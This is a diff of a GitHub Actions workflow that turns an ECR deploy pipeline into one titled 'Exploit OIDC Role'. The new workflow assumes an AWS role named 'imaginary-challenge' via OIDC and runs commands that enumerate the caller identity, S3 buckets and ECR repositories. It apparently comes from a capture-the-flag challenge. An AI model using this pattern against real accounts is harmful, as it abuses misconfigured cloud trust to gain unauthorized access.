@@ -1,44 +1,27 @@
-name: Deploy to AWS ECR
+name: Exploit OIDC Role
 
 on:
-  push:
-    branches:
-      - main
   workflow_dispatch:
 
-permissions:
-  id-token: write
-  contents: read
-
 jobs:
-  deploy:
-    name: Build and Push to ECR
+  assume-role:
     runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
 
     steps:
-      - name: Checkout repository
+      - name: Checkout
         uses: actions/checkout@v4
 
-      - name: Configure AWS Credentials (OIDC)
+      - name: Configure AWS credentials via OIDC
         uses: aws-actions/configure-aws-credentials@v4
         with:
-          role-to-assume: arn:aws:iam::396961015104:role/GitHubActionsRole
+          role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
           aws-region: us-east-1
 
-      - name: Get ECR Login Password and Authenticate Docker
+      - name: Dump AWS identity info
         run: |
-          echo "🔑 Logging into Amazon ECR..."
-          aws ecr get-login-password --region us-east-1 | docker login --username AWS --password-stdin 396961015104.dkr.ecr.us-east-1.amazonaws.com
-          echo "✅ Login successful"
-
-      - name: Build Docker Image
-        run: |
-          echo "🐳 Building Docker image..."
-          docker build -t 396961015104.dkr.ecr.us-east-1.amazonaws.com/2025-imagine:latest .
-          echo "✅ Build complete"
-
-      - name: Push Docker Image to ECR
-        run: |
-          echo "📦 Pushing Docker image..."
-          docker push 396961015104.dkr.ecr.us-east-1.amazonaws.com/2025-imagine:latest
-          echo "🚀 Push complete"
+          aws sts get-caller-identity
+          aws s3 ls || true
+          aws ecr describe-repositories || true
